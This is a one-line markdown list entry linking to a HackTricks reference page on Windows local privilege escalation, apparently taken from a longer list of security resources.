  * [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
